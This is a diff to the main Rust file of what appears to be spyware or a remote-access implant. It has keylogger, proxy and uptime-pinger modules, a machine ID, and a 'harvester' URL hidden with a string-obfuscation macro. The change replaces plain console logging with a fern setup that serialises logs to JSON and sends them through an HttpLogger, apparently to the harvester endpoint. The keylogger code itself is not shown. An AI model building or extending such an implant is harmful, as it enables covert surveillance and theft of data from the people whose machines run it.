@@ -7,9 +7,7 @@ use std::{
     time::Duration,
 };
 
-use chrono::{NaiveDateTime, TimeZone, Utc};
-use env_logger::Env;
-use log::{LevelFilter, info};
+use log::info;
 use muddy::muddy;
 use once_cell::sync::Lazy;
 use reqwest::{
@@ -18,10 +16,8 @@ use reqwest::{
 };
 
 mod http_logger;
-pub use http_logger::init_http_logger;
 
 mod uptime_pinger;
-use tokio::time::sleep;
 pub use uptime_pinger::uptime_pinger;
 
 mod keylogger;
@@ -32,6 +28,10 @@ pub use proxy::proxy;
 
 mod resources;
 pub use resources::resources;
+
+use log_json_serializer::parse_log;
+
+use crate::http_logger::HttpLogger;
 
 static HARVESTER_URL: Lazy<&'static str> = Lazy::new(|| muddy!("localhost:6767"));
 static MACHINE_ID: Lazy<String> =
@@ -44,13 +44,29 @@ pub struct GlobalState {
 
 #[tokio::main]
 async fn main() {
-    env_logger::Builder::new()
-        .filter_level(LevelFilter::Info)
-        .filter_module("trust_dns_proto", LevelFilter::Error)
-        .filter_module("trust_dns_resolver", LevelFilter::Error)
-        .init();
-
-    // init_http_logger(LevelFilter::Info).unwrap();
+    fern::Dispatch::new()
+        .format(|out, message, record| {
+            out.finish(format_args!(
+                "{}",
+                parse_log(message, record).expect("failed to serialize log into json")
+            ));
+        })
+        .level(log::LevelFilter::Info)
+        .chain(std::io::stdout())
+        .chain(
+            fern::Dispatch::new()
+                .filter(|metadata| {
+                    let target = metadata.target();
+                    !target.starts_with("hyper")
+                        && !target.starts_with("reqwest")
+                        && !target.starts_with("h2")
+                        && !target.starts_with("tower")
+                        && !target.starts_with("rustls")
+                })
+                .chain(fern::Output::writer(Box::new(HttpLogger::new()), "")),
+        )
+        .apply()
+        .unwrap();
 
     info!("outlet inited with machine id: {:?}", *MACHINE_ID);
 
